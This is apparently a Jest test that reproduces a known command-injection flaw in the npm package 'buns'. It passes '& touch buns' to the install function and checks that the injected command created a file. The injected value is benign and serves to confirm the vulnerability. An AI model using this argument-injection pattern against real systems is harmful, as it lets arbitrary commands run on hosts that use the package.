//https://snyk.io/vuln/SNYK-JS-BUNS-1050389
test("Command Injection in buns", () => {
  var root = require("buns");
  const fs = require("fs");
  const path = "./buns";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  var name = "& touch buns";
  try {
    root.install(name);
  } catch (error) {
    console.log("error");
  }

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
